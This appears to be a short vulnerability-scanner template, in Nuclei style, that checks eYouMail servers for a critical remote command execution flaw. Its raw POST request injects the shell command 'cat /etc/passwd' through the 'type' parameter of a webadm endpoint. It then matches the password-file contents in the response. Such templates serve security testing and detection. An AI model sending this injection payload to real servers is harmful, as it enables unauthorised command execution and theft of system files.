id: eyoumail-rce
info:
  author: str1am
  name: "eYouMail\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C"
  severity: critical
  tags: eyoumail,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - regex:
    - 'root:.*:0:0:'
    type: regex
  matchers-condition: and
  raw:
  - 'POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    type=''|cat /etc/passwd||''

    '
